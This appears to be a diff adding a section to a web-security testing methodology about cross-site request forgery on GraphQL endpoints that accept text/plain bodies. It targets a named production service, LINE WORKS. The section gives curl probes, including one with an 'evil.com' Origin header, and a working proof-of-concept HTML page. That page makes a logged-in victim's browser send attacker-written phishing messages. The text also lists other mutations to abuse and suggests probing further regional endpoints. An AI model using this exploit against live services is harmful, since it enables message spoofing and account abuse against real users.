@@ -347,6 +347,85 @@ for f in d['data']['__schema']['queryType']['fields']:
 
 ---
 
+### CSRF on GraphQL via Content-Type Bypass (Proven — LINE WORKS June 2026)
+
+When a GraphQL endpoint:
+1. Has no authentication layer (relies on cookies from the web app)
+2. Accepts `Content-Type: text/plain` (processes JSON body regardless of content-type header)
+3. Returns no CORS headers (no `Access-Control-Allow-Origin`)
+
+...then **blind CSRF is viable for all write operations** because `text/plain` doesn't trigger a CORS preflight.
+
+**Discovery methodology:**
+
+```bash
+# Step 1: Confirm endpoint accepts text/plain
+curl -s "$GQL_ENDPOINT" \
+  -H "Content-Type: text/plain" \
+  -d '{"query":"{ __typename }"}' 
+# If it returns valid GraphQL response → no preflight needed for cross-origin POST
+
+# Step 2: Confirm no CORS headers (response can't be READ cross-origin, but writes still execute)
+curl -sI "$GQL_ENDPOINT" -H "Origin: https://evil.com" | grep -i access-control
+# Empty = no CORS policy = browser blocks response reading
+# BUT the request still EXECUTES server-side (blind CSRF)
+
+# Step 3: Test write operation via text/plain
+curl -s "$GQL_ENDPOINT" \
+  -H "Content-Type: text/plain" \
+  -d '{"query":"{ batch_send_message(userNo: \"1\", content: \"csrf\", channelNos: [1], domainId: 1, serviceId: \"1\", msgTid: 1) { message result } }"}'
+# If backend processes it (returns business logic error, not auth error) → blind CSRF works
+```
+
+**PoC HTML (blind CSRF — attacker can't read response but write executes):**
+
+```html
+<html>
+<body>
+<script>
+// Victim visits this page while logged into LINE WORKS
+// Browser sends victim's session cookies, no preflight because text/plain
+fetch("https://cxtalk-service.line-works.com/jp1/gquery", {
+  method: "POST",
+  headers: {"Content-Type": "text/plain"},
+  credentials: "include",
+  body: JSON.stringify({
+    query: '{ batch_send_message(userNo: "VICTIM_ID", content: "Phishing message from attacker", channelNos: [TARGET_CHANNEL], domainId: DOMAIN, serviceId: "svc", msgTid: 1) { message result } }'
+  })
+});
+// Also works: batch_join_chat, set_user_options, batch_forward_message
+</script>
+</body>
+</html>
+```
+
+**Key conditions for this to work:**
+- Endpoint must accept `text/plain` or `application/x-www-form-urlencoded` (simple request types)
+- Authentication must be cookie-based (not header-based Bearer tokens)
+- The GraphQL operation must be a write/mutation that doesn't need response reading
+- No SameSite=Strict on session cookies
+
+**Content-type acceptance check matrix:**
+
+| Content-Type | Preflight Required? | GraphQL Usually Accepts? |
+|---|---|---|
+| `application/json` | YES | Yes (standard) |
+| `text/plain` | NO | Sometimes (depends on parser) |
+| `application/x-www-form-urlencoded` | NO | Rarely (needs form-style query param) |
+| `multipart/form-data` | NO | Rarely |
+
+**Severity escalation:**
+- Introspection alone = Medium
+- Introspection + no auth on write operations = High  
+- Introspection + no auth on writes + CSRF via text/plain = High-Critical (attacker can trigger writes FROM VICTIM'S BROWSER without victim interaction beyond visiting a page)
+
+**Why this matters even when you get "ERR" responses:**
+The backend returns "ERR" because we don't have valid channelNo/domainId/userNo values. But when a REAL victim's browser makes this request, their session cookie provides the authentication context — the backend will resolve their identity and execute the operation with THEIR valid IDs. The "ERR" we see as unauthenticated attackers becomes "SUCCESS" when the victim's cookie is attached.
+
+**Multi-region check:** Enterprise services often run in multiple regions. If `/jp1/gquery` is vulnerable, test `/jp2/gquery`, `/kr1/gquery`, etc. — they usually share the same codebase.
+
+---
+
 ### Nested Query DoS (Resource Exhaustion)
 
 ```bash
